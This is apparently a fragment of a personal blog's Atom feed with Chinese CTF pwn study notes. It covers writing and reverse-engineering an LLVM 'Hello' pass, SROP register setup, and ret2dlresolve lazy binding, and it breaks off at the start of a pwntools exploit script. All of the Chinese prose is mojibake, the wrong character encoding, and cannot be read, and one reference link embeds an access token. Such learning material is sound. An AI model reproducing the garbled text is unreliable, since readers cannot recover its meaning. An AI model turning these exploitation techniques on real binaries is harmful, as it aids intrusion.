worldâ€çš„passï¼Œä¸‹é¢æ˜¯<a href="https://llvm.org/docs/WritingAnLLVMPass.html">å®˜æ–¹</a>çš„ç¤ºä¾‹</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"llvm/Pass.h"</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"llvm/IR/Function.h"</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"llvm/Support/raw_ostream.h"</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"llvm/IR/LegacyPassManager.h"</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"llvm/Transforms/IPO/PassManagerBuilder.h"</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> llvm;<br><br><span class="hljs-keyword">namespace</span> {<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Hello</span> : <span class="hljs-keyword">public</span> FunctionPass {<br>  <span class="hljs-type">static</span> <span class="hljs-type">char</span> ID;<br>  <span class="hljs-built_in">Hello</span>() : <span class="hljs-built_in">FunctionPass</span>(ID) {}<br><br>  <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">runOnFunction</span><span class="hljs-params">(Function &amp;F)</span> <span class="hljs-keyword">override</span> </span>{<br>    <span class="hljs-built_in">errs</span>() &lt;&lt; <span class="hljs-string">"Hello: "</span>;<br>    <span class="hljs-built_in">errs</span>().<span class="hljs-built_in">write_escaped</span>(F.<span class="hljs-built_in">getName</span>()) &lt;&lt; <span class="hljs-string">'\n'</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  }<br>}; <span class="hljs-comment">// end of struct Hello</span><br>}  <span class="hljs-comment">// end of anonymous namespace</span><br><br><span class="hljs-type">char</span> Hello::ID = <span class="hljs-number">0</span>;<br><span class="hljs-function"><span class="hljs-type">static</span> RegisterPass&lt;Hello&gt; <span class="hljs-title">X</span><span class="hljs-params">(<span class="hljs-string">"hello"</span>, <span class="hljs-string">"Hello World Pass"</span>,</span></span><br><span class="hljs-params"><span class="hljs-function">                             <span class="hljs-literal">false</span> <span class="hljs-comment">/* Only looks at CFG */</span>,</span></span><br><span class="hljs-params"><span class="hljs-function">                             <span class="hljs-literal">false</span> <span class="hljs-comment">/* Analysis Pass */</span>)</span></span>;<br><br><span class="hljs-function"><span class="hljs-type">static</span> RegisterStandardPasses <span class="hljs-title">Y</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">    PassManagerBuilder::EP_EarlyAsPossible,</span></span><br><span class="hljs-params"><span class="hljs-function">    [](<span class="hljs-type">const</span> PassManagerBuilder &amp;Builder,</span></span><br><span class="hljs-params"><span class="hljs-function">       legacy::PassManagerBase &amp;PM) { PM.add(<span class="hljs-keyword">new</span> Hello()); })</span></span>;<br></code></pre></td></tr></tbody></table></figure><p>å…ˆå£°æ˜passæœ¬èº«ï¼Œç„¶åå£°æ˜äº†ä¸€ä¸ª<code>Hello</code>ç±»ï¼Œå®ƒæ˜¯FunctionPassçš„å­ç±»ã€‚ç¨åå°†è¯¦ç»†æè¿°ä¸åŒçš„å†…ç½®passå­ç±»ï¼Œä½†æ˜¯ç°åœ¨çŸ¥é“FunctionPassä¸€æ¬¡å¯¹ä¸€ä¸ªå‡½æ•°è¿›è¡Œæ“ä½œã€‚</p><p>ç„¶åå£°æ˜äº†LLVMç”¨äºæ ‡è¯†passçš„passæ ‡è¯†ç¬¦ã€‚ è¿™å…è®¸LLVMé¿å…ä½¿ç”¨æ˜‚è´µçš„C ++è¿è¡Œæ—¶ä¿¡æ¯ï¼Œå¦‚ä¸‹</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">static</span> <span class="hljs-type">char</span> ID;<br><span class="hljs-built_in">Hello</span>() : <span class="hljs-built_in">FunctionPass</span>(ID) {}<br></code></pre></td></tr></tbody></table></figure><p>ç„¶åå£°æ˜äº†ä¸€ä¸ªrunOnFunctionæ–¹æ³•ï¼Œå®ƒè¦†ç›–äº†ä»FunctionPassç»§æ‰¿çš„æŠ½è±¡è™šæ–¹æ³•ã€‚ è¿™æ˜¯æˆ‘ä»¬åº”è¯¥åšçš„äº‹æƒ…ï¼Œæ‰€ä»¥æˆ‘ä»¬åªç”¨æ¯ä¸ªå‡½æ•°çš„åç§°æ‰“å°å‡ºæˆ‘ä»¬çš„æ¶ˆæ¯ã€‚ä»£ç å¦‚ä¸‹</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">runOnFunction</span><span class="hljs-params">(Function &amp;F)</span> <span class="hljs-keyword">override</span> </span>{<br>    <span class="hljs-built_in">errs</span>() &lt;&lt; <span class="hljs-string">"Hello: "</span>;<br>    <span class="hljs-built_in">errs</span>().<span class="hljs-built_in">write_escaped</span>(F.<span class="hljs-built_in">getName</span>()) &lt;&lt; <span class="hljs-string">'\n'</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  }<br>}; <span class="hljs-comment">// end of struct Hello</span><br>}  <span class="hljs-comment">// end of anonymous namespace</span><br></code></pre></td></tr></tbody></table></figure><p>æ¥ç€åˆå§‹åŒ–passIDã€‚ LLVMä½¿ç”¨IDçš„åœ°å€æ¥æ ‡è¯†passï¼Œå› æ­¤åˆå§‹åŒ–å€¼å¹¶ä¸é‡è¦ã€‚ä»£ç å¦‚ä¸‹</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">char</span> Hello::ID = <span class="hljs-number">0</span>;<br></code></pre></td></tr></tbody></table></figure><p>æœ€åï¼Œæˆ‘ä»¬æ³¨å†Œæˆ‘ä»¬çš„ç±»Helloï¼Œç»™å®ƒä¸€ä¸ªå‘½ä»¤è¡Œå‚æ•°â€œhelloâ€ï¼Œå¹¶å‘½åä¸ºâ€œHello World Passâ€ã€‚ æœ€åä¸¤ä¸ªå‚æ•°æè¿°äº†å®ƒçš„è¡Œä¸ºï¼šå¦‚æœä¼ é€’éå†CFGè€Œä¸ä¿®æ”¹å®ƒï¼Œé‚£ä¹ˆç¬¬ä¸‰ä¸ªå‚æ•°è®¾ç½®ä¸ºtrue; å¦‚æœpassæ˜¯åˆ†æpassï¼Œä¾‹å¦‚æ”¯é…æ ‘passï¼Œåˆ™æä¾›trueä½œä¸ºç¬¬å››ä¸ªå‚æ•°ã€‚ä»£ç å¦‚ä¸‹</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">static</span> RegisterPass&lt;Hello&gt; <span class="hljs-title">X</span><span class="hljs-params">(<span class="hljs-string">"hello"</span>, <span class="hljs-string">"Hello World Pass"</span>,</span></span><br><span class="hljs-params"><span class="hljs-function">                             <span class="hljs-literal">false</span> <span class="hljs-comment">/* Only looks at CFG */</span>,</span></span><br><span class="hljs-params"><span class="hljs-function">                             <span class="hljs-literal">false</span> <span class="hljs-comment">/* Analysis Pass */</span>)</span></span>;<br></code></pre></td></tr></tbody></table></figure><p>å¦‚æœæˆ‘ä»¬æƒ³å°†é€šé“æ³¨å†Œä¸ºç°æœ‰ç®¡é“çš„ä¸€ä¸ªæ­¥éª¤ï¼Œåˆ™æä¾›äº†ä¸€äº›æ‰©å±•ç‚¹ï¼Œä¾‹å¦‚<code>PassManagerBuilder::EP_EarlyAsPossible</code>åœ¨ä»»ä½•ä¼˜åŒ–ä¹‹å‰åº”ç”¨æˆ‘ä»¬çš„é€šé“ï¼Œæˆ–è€…<code>PassManagerBuilder::EP_FullLinkTimeOptimizationLast</code> åœ¨é“¾æ¥æ—¶é—´ä¼˜åŒ–ä¹‹ååº”ç”¨å®ƒã€‚ä»£ç å¦‚ä¸‹</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">static</span> llvm::RegisterStandardPasses <span class="hljs-title">Y</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">    llvm::PassManagerBuilder::EP_EarlyAsPossible,</span></span><br><span class="hljs-params"><span class="hljs-function">    [](<span class="hljs-type">const</span> llvm::PassManagerBuilder &amp;Builder,</span></span><br><span class="hljs-params"><span class="hljs-function">       llvm::legacy::PassManagerBase &amp;PM) { PM.add(<span class="hljs-keyword">new</span> Hello()); })</span></span>;<br></code></pre></td></tr></tbody></table></figure><p>ç°åœ¨éœ€è¦å°†è¿™ä¸ªPassç¼–è¯‘æˆæ¨¡å—ï¼Œä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å³å¯</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++">clang<span class="hljs-number">-12</span> `llvm-config --cxxflags` -Wl,-znodelete -fno-rtti -fPIC -shared Hello.cpp -o LLVMHello.so `llvm-config --ldflags`<br></code></pre></td></tr></tbody></table></figure><p>ç°åœ¨åº”è¯¥ä¼šçœ‹åˆ°LLVMHello.soè¿™ä¸ªæ–‡ä»¶ï¼Œé€šè¿‡å®˜æ–¹æ–‡æ¡£å¯çŸ¥éœ€è¦ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++">opt -load LLVMHello.so -hello test.ll<br></code></pre></td></tr></tbody></table></figure><p>è¿™é‡Œçš„ -helloç”±Hello.cppä¸­çš„<code>static RegisterPass&lt;Hello&gt; X</code>å‚æ•°å†³å®š</p><p>ä½†æ˜¯ç¬”è€…è¿™é‡ŒæŠ¥äº†ä¸€ä¸ªé”™<code>Error opening 'LLVMHello.so': LLVMHello.so: cannot open shared object file: No such file or directory</code>ï¼Œè¿™æ˜¯å› ä¸ºlinuxæ— æ³•åœ¨é»˜è®¤åœ°å€æ‰¾åˆ°LLVMHello.soï¼Œè§£å†³å¾ˆç®€å•`sudo cp LLVMHello.so /lib</p><p class='item-img' data-src='https://s2.loli.net/2023/10/28/XWF4LHKzkSwchIb.png'><img src="https://s2.loli.net/2023/10/28/XWF4LHKzkSwchIb.png" alt="image.png"></p><p>æˆåŠŸè¾“å‡ºtest.cæ‰€æœ‰å‡½æ•°åç§°</p><h2 id="å¯¹ç¬¬ä¸€ä¸ªLLVM-Passé€†å‘åˆ†æ"><a href="#å¯¹ç¬¬ä¸€ä¸ªLLVM-Passé€†å‘åˆ†æ" class="headerlink" title="å¯¹ç¬¬ä¸€ä¸ªLLVM Passé€†å‘åˆ†æ"></a>å¯¹ç¬¬ä¸€ä¸ªLLVM Passé€†å‘åˆ†æ</h2><p>åˆšåˆšç”Ÿæˆäº†LLVMHello.soè¿™ä¸ªpassæ–‡ä»¶ï¼Œæ¯”èµ›é¢˜å’Œä¸Šé¢ä¹Ÿä¸€æ ·ï¼Œä¼šé‡å†™<code>FunctionPass</code>ç±»ä¸­çš„<code>runOnFunction</code>å‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯¹ä¸Šé¢çš„ç¤ºä¾‹ç¨‹åºè¿›è¡Œé€†å‘åˆ†æï¼Œçœ‹ä¸€ä¸‹è™šè¡¨ä½ç½®è¿™æ ·æ–¹ä¾¿æ¯”èµ›çš„æ—¶å€™ç¡®å®šæ¯ä¸ªå‡½æ•°çš„ä½ç½®</p><p class='item-img' data-src='https://s2.loli.net/2023/10/28/Yi63r1Ju9amMwxf.png'><img src="https://s2.loli.net/2023/10/28/Yi63r1Ju9amMwxf.png" alt="image.png"></p><p>è·Ÿè¿›RegisterPass</p><p class='item-img' data-src='https://s2.loli.net/2023/10/28/75lPFTus26yqtnf.png'><img src="https://s2.loli.net/2023/10/28/75lPFTus26yqtnf.png" alt="image.png"></p><p>å‘ç°è°ƒç”¨äº†callDefaultCtorè¿›è¡Œå¯¹è±¡åˆ›å»ºï¼Œè·Ÿè¿›å®ƒ</p><p class='item-img' data-src='https://s2.loli.net/2023/10/28/LUV5XROSuFNvtMm.png'><img src="https://s2.loli.net/2023/10/28/LUV5XROSuFNvtMm.png" alt="image.png"></p><p>ç»™Helloå¯¹è±¡åˆ†é…äº†0x20ä¸ªç©ºé—´ï¼Œè·Ÿè¿›Hello</p><p class='item-img' data-src='https://s2.loli.net/2023/10/28/EyKMYARvXJco7gu.png'><img src="https://s2.loli.net/2023/10/28/EyKMYARvXJco7gu.png" alt="image.png"></p><p>çœ‹åˆ°è™šè¡¨äº†ï¼Œç›´æ¥è·Ÿè¿›</p><p class='item-img' data-src='https://s2.loli.net/2023/10/28/uP6tBspbYAe4HwU.png'><img src="https://s2.loli.net/2023/10/28/uP6tBspbYAe4HwU.png" alt="image.png"></p><p><code>runOnFunction</code>å‡½æ•°ä½äºè™šè¡¨ä¸­çš„æœ€åä¸€ä¸ªä½ç½®ï¼Œå› ä¸ºrunOnFunctionå‡½æ•°è¢«æˆ‘ä»¬é‡å†™äº†ï¼Œæ‰€ä»¥å®ƒæŒ‡å‘çš„æ˜¯æˆ‘ä»¬è‡ªå®šä¹‰çš„é‚£ä¸ªå‡½æ•°ï¼Œæ¯”èµ›é¢˜çš„æ¼æ´åŸºæœ¬å°±æ˜¯è¿™ä¸ªï¼Œæ‰€ä»¥åœ¨åšLLVM Pass pwnçš„æ—¶å€™å®šä½å‡½æ•°çš„ä½ç½®å¯ä»¥ä»è™šè¡¨å…¥æ‰‹</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>æ”¶è·å¾ˆå¤§ï¼Œä»ç¼–è¯‘è¿‡ç¨‹åˆ°LLVMï¼ŒåŠ å›ºäº†è®¡ç®—æœºåº•å±‚çš„ä¸€äº›çŸ¥è¯†ï¼ŒçŸ¥é“äº†LLVM PASS PWNè¯¥æ€ä¹ˆå…¥æ‰‹ï¼Œä»¥å‰çœ‹åˆ°LLVM PASS PWNçš„æ—¶å€™éƒ½ä¸çŸ¥é“æ€ä¹ˆè¿è¡Œï¼ˆXDï¼‰ï¼Œè¿™é‡Œç¬¬ä¸€ç¯‡å°±ç»“æŸäº†ï¼Œåé¢ä¼šç»§ç»­æ›´æ–°</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://zhuanlan.zhihu.com/p/130702001">https://zhuanlan.zhihu.com/p/130702001</a></p><p><a href="https://zhuanlan.zhihu.com/p/122522485">https://zhuanlan.zhihu.com/p/122522485</a></p><p><a href="https://www.homedt.net/196837.html">https://www.homedt.net/196837.html</a></p><p><a href="https://llvm.org/docs/WritingAnLLVMPass.html">https://llvm.org/docs/WritingAnLLVMPass.html</a></p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;LLVM-PASS-PWNï¼ˆä¸€ï¼‰&quot;&gt;&lt;a href=&quot;#LLVM-PASS-PWNï¼ˆä¸€ï¼‰&quot; class=&quot;headerlink&quot; title=&quot;LLVM PASS PWNï¼ˆä¸€ï¼‰&quot;&gt;&lt;/a&gt;LLVM PASS PWNï¼ˆä¸€ï¼‰&lt;/h1&gt;&lt;h2 id=&quot;å‰ç½®çŸ¥è¯†ç®€è¿°&quot;&gt;&lt;</summary>
      
    
    
    
    <category term="LLVM PASS PWN" scheme="https://kylinxin.github.io/categories/LLVM-PASS-PWN/"/>
    
    
    <category term="LLVM PASS PWNï¼ˆä¸€ï¼‰" scheme="https://kylinxin.github.io/tags/LLVM-PASS-PWN%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    
  </entry>
  
  <entry>
    <title>SROP</title>
    <link href="https://kylinxin.github.io/2023/10/25/SROP/"/>
    <id>https://kylinxin.github.io/2023/10/25/SROP/</id>
    <published>2023-10-25T15:14:29.000Z</published>
    <updated>2023-10-25T10:30:13.758Z</updated>
    
    <content type="html"><![CDATA[<h1 id="é«˜çº§ROP-SROP"><a href="#é«˜çº§ROP-SROP" class="headerlink" title="é«˜çº§ROP-SROP"></a>é«˜çº§ROP-SROP</h1><p>ä¹‹å‰ä¸€ç›´æ²¡æŒæ¡SROPæŠ€æœ¯ï¼Œä»¥æ­¤ç¯‡é‡æ–°å­¦ä¹ ä¸€ä¸‹SROP</p><h3 id="åˆ©ç”¨å·¥å…·"><a href="#åˆ©ç”¨å·¥å…·" class="headerlink" title="åˆ©ç”¨å·¥å…·"></a>åˆ©ç”¨å·¥å…·</h3><p>åœ¨ç›®å‰çš„pwntoolsä¸­å·²ç»é›†æˆäº†å¯¹äºsropçš„æ”»å‡»ã€‚</p><h3 id="ä½¿ç”¨æƒ…å†µ"><a href="#ä½¿ç”¨æƒ…å†µ" class="headerlink" title="ä½¿ç”¨æƒ…å†µ"></a>ä½¿ç”¨æƒ…å†µ</h3><p>åœ¨æ±‡ç¼–ä»£ç ä¸­çœ‹åˆ°å­˜åœ¨systemcallçš„æ—¶å€™å¯ä»¥è€ƒè™‘é‡‡ç”¨è¯¥æ–¹æ³•è¿›è¡Œå°è¯•</p><p>ä¸‹é¢ç»™å‡ºæˆ‘ä»¬å°†ä¼šç”¨åˆ°çš„64ä½å‡½æ•°åŠå‡½æ•°è°ƒç”¨å·å’Œå‡½æ•°åŸå‹</p><table><thead><tr><th>ç³»ç»Ÿè°ƒç”¨</th><th>è°ƒç”¨å·</th><th>å‡½æ•°åŸå‹</th></tr></thead><tbody><tr><td>read</td><td>0</td><td>read( int fd, void *buf, size_t count )</td></tr><tr><td>write</td><td>1</td><td>write( int fd, const void *buf, size_t count )</td></tr><tr><td>sigreturn</td><td>15</td><td>int sigreturn( â€¦ )</td></tr><tr><td>execve</td><td>59</td><td>execve( const char *filename, char *const argv[], char *const envp[] )</td></tr></tbody></table><p>###ä½¿ç”¨sigreturnå¯¹readå‡½æ•°è°ƒç”¨çš„å¯„å­˜å™¨è¿›è¡Œéƒ¨ç½²<br>æ¥ä¸‹æ¥å°±éœ€è¦æ³¨æ„äº†ï¼Œæˆ‘ä»¬è¿›å…¥æ„é€ çš„é˜¶æ®µã€‚æˆ‘ä»¬éœ€è¦é€šè¿‡sigreturnçš„è°ƒç”¨æ¥å®ç°å¯¹readå‡½æ•°è°ƒç”¨å¯„å­˜å™¨çš„éƒ¨ç½²ã€‚å€¼å¾—é«˜å…´çš„æ˜¯pwntoolsä¸­å·²ç»æœ‰äº†è°ƒç”¨sigreturnçš„åŠŸèƒ½ï¼Œæ‰€ä»¥åœ¨å†™EXPçš„æ—¶å€™å¯ä»¥ç›´æ¥ä½¿ç”¨ã€‚å†éƒ¨ç½²ä¹‹å‰æˆ‘ä»¬éœ€è¦ä¹‹æƒ³å¥½åœ¨å“ªå‡ ä¸ªå¯„å­˜å™¨ä¸­éƒ¨ç½²ä»€ä¹ˆå€¼ï¼Œä¸‹é¢åˆ—å‡ºæ¥ä¸€ä¸€è®²è§£</p><table><thead><tr><th>å¯„å­˜å™¨å’ŒæŒ‡ä»¤</th><th>å­˜å‚¨æ•°æ®</th></tr></thead><tbody><tr><td>rax</td><td>ç³»ç»Ÿè°ƒç”¨å·</td></tr><tr><td>rdi</td><td>0</td></tr><tr><td>rsi</td><td>addr</td></tr><tr><td>rdx</td><td>len</td></tr><tr><td>rsp</td><td>addr</td></tr><tr><td>rip</td><td>syscall_ret</td></tr></tbody></table><blockquote><p>é¦–å…ˆæ˜¯raxå¯„å­˜å™¨ä¸­ä¸€å®šæ˜¯å­˜æ”¾readå‡½æ•°çš„ç³»ç»Ÿè°ƒç”¨å·å•¦ï¼Œå› ä¸ºåŸæ±‡ç¼–ä»£ç ä½¿ç”¨çš„æ˜¯syscallï¼Œè¿™ä¸ªä¸å¤šè¯´äº†<br>â—rdiå¯„å­˜å™¨ä½œä¸ºreadå‡½æ•°çš„ä¸€å‚ï¼Œ0ä»£è¡¨æ ‡å‡†è¾“å…¥<br>â—rsiå¯„å­˜å™¨ä½œä¸ºreadå‡½æ•°çš„äºŒå‚ï¼Œé‡Œé¢å­˜æ”¾çš„æ˜¯å‰é¢é€šè¿‡writeå‡½æ•°æ‰“å°å‡ºæ¥çš„æ–°æ ˆé¡¶çš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯è¯´å°†æ¥æ”¶åˆ°çš„ä¿¡æ¯å†™åˆ°æˆ‘ä»¬å‰é¢é€šè¿‡writeå‡½æ•°æ‰“å°çš„æ–°æ ˆé¡¶çš„ä½ç½®<br>â—rdxä½œä¸ºreadå‡½æ•°çš„ä¸‰å‚å†™0x400ä¸ªå­—èŠ‚<br>â—rspå¯„å­˜å™¨éœ€è¦å’Œrsiä¿æŒä¸€è‡´ï¼Œåœ¨å†™çš„æ—¶å€™å†™åœ¨rspæŒ‡å‘çš„ä½ç½®<br>â—ripå¯„å­˜å™¨æŒ‡å‘syscall_retï¼Œç¡®ä¿åœ¨readå‡½æ•°å¯„å­˜å™¨éƒ¨ç½²æˆåŠŸä¹‹åå¯ä»¥ç›´æ¥è°ƒç”¨readå‡½æ•°</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;é«˜çº§ROP-SROP&quot;&gt;&lt;a href=&quot;#é«˜çº§ROP-SROP&quot; class=&quot;headerlink&quot; title=&quot;é«˜çº§ROP-SROP&quot;&gt;&lt;/a&gt;é«˜çº§ROP-SROP&lt;/h1&gt;&lt;p&gt;ä¹‹å‰ä¸€ç›´æ²¡æŒæ¡SROPæŠ€æœ¯ï¼Œä»¥æ­¤ç¯‡é‡æ–°å­¦ä¹ ä¸€ä¸‹SROP&lt;/p&gt;
&lt;h3 id</summary>
      
    
    
    
    <category term="pwn è¿›é˜¶" scheme="https://kylinxin.github.io/categories/pwn-%E8%BF%9B%E9%98%B6/"/>
    
    
    <category term="SROP" scheme="https://kylinxin.github.io/tags/SROP/"/>
    
  </entry>
  
  <entry>
    <title>ret2dlresolve</title>
    <link href="https://kylinxin.github.io/2023/10/25/ret2dlresolve%E5%AD%A6%E4%B9%A0/"/>
    <id>https://kylinxin.github.io/2023/10/25/ret2dlresolve%E5%AD%A6%E4%B9%A0/</id>
    <published>2023-10-25T15:14:29.000Z</published>
    <updated>2023-10-25T12:43:55.773Z</updated>
    
    <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>å€Ÿé‰´æ–‡æ¡£ï¼š<a href="https://blog.csdn.net/qq_51868336/article/details/114644569?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTgyMjE0OTksImZpbGVHVUlEIjoiUVBNUnh6R2t0enNabnpoeiIsImlhdCI6MTY5ODIyMTE5OSwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjotODMzNTY3NjEwMX0.6h_vJ55b-Q434hFOdAu0-8iK6sq18c0emOswHSLqfH4">ã€ç²¾é€‰ã€‘ret2dlresolveè¶…è¯¦ç»†æ•™ç¨‹(x86&amp;x64)-CSDNåšå®¢</a></p><h2 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h2><h3 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h3><p>åœ¨<a href="https://so.csdn.net/so/search?q=Linux&amp;spm=1001.2101.3001.7020">Linux</a>ä¸­ï¼Œç¨‹åºä½¿ç”¨_dl_runtime_resolve(link_map,reloc_offset)æ¥å¯¹åŠ¨æ€é“¾æ¥çš„å‡½æ•°è¿›è¡Œé‡å®šä½ã€‚</p><p>è€Œret2dlresolveæ”»å‡»çš„æ ¸å¿ƒå°±æ˜¯æ§åˆ¶ç›¸åº”çš„å‚æ•°åŠå…¶å¯¹åº”åœ°å€çš„å†…å®¹ï¼Œä»è€Œæ§åˆ¶è§£æçš„å‡½æ•°ã€‚</p><h3 id="å»¶è¿Ÿç»‘å®šæœºåˆ¶"><a href="#å»¶è¿Ÿç»‘å®šæœºåˆ¶" class="headerlink" title="å»¶è¿Ÿç»‘å®šæœºåˆ¶"></a>å»¶è¿Ÿç»‘å®šæœºåˆ¶</h3><p>ç¬¬ä¸€æ¬¡è°ƒç”¨ä¸€ä¸ªå‡½æ•°æ—¶ï¼Œå…ˆæ˜¯åˆ°pltè¡¨ï¼Œç„¶åjmpåˆ°gotè¡¨</p><p class='item-img' data-src='https://s2.loli.net/2023/10/25/2gimIN6C7SLXRp3.png'><img src="https://s2.loli.net/2023/10/25/2gimIN6C7SLXRp3.png" alt="image.png"></p><p>æ­¤æ—¶gotè¡¨å­˜çš„åœ°å€æ˜¯åœ¨pltè¡¨ä¸Š</p><p class='item-img' data-src='https://s2.loli.net/2023/10/25/lvKA2cjSYiwhPxW.png'><img src="https://s2.loli.net/2023/10/25/lvKA2cjSYiwhPxW.png" alt="image.png"></p><p>å…¶å®ä¹Ÿå°±æ˜¯jmp gotçš„ä¸‹ä¸€æ¡æŒ‡ä»¤ï¼Œè¿™é‡Œå…ˆæ˜¯pushä¸€ä¸ªæ•°å­—ï¼ˆè¯¥å‡½æ•°åœ¨rel.pltä¸Šçš„åç§»,reloc_argï¼Œåæ–‡ä¼šè®²åˆ°ï¼‰ï¼Œç„¶åjmpåˆ°plt[0] (0x8048380)</p><p class='item-img' data-src='https://s2.loli.net/2023/10/25/4heH2vXBcwJuPVd.png'><img src="https://s2.loli.net/2023/10/25/4heH2vXBcwJuPVd.png" alt="image.png"></p><p>åœ¨plt[0]å¤„å…ˆæ˜¯push got[1]ï¼Œgot[1]å°±æ˜¯link_mapï¼ˆé“¾æ¥å™¨çš„æ ‡è¯†ä¿¡æ¯,åæ–‡ä¼šè®²åˆ°ï¼‰ï¼Œç„¶åjmpåˆ°got[2]å¤„ï¼Œgot[2]å°±æ˜¯_dl_runtime_resolveå‡½æ•°çš„åœ°å€</p><p class='item-img' data-src='https://s2.loli.net/2023/10/25/FAk9bBdJD1OQus6.png'><img src="https://s2.loli.net/2023/10/25/FAk9bBdJD1OQus6.png" alt="image.png"></p><p class='item-img' data-src='https://s2.loli.net/2023/10/25/tdvWZqcRnPQgjHL.png'><img src="https://s2.loli.net/2023/10/25/tdvWZqcRnPQgjHL.png" alt="image.png"></p><p>æ‰€ä»¥ç›¸å½“äºæ‰§è¡Œäº†</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">_dl_runtime_resolve(link_map,reloc_arg)<br></code></pre></td></tr></tbody></table></figure><p>è¿™ä¸ªå‡½æ•°ä¼šå®Œæˆç¬¦å·çš„è§£æï¼Œå³å°†çœŸå®çš„writeå‡½æ•°åœ°å€å†™å…¥å…¶GOTè¡¨å¯¹åº”çš„æ¡ç›®ä¸­ï¼Œéšåå°†æ§åˆ¶å™¨äº¤ç»™è¢«è§£æçš„å‡½æ•°</p><h3 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h3><h3 id="NO-RELRO"><a href="#NO-RELRO" class="headerlink" title="NO RELRO"></a>NO RELRO</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *  <br>context(os=<span class="hljs-string">'linux'</span>,arch=<span class="hljs-string">'amd64'</span>,log_level=<span class="hljs-string">'debug'</span>)<br><br>r = process(<span class="hljs-string">'./'</span>)  <br>elf = 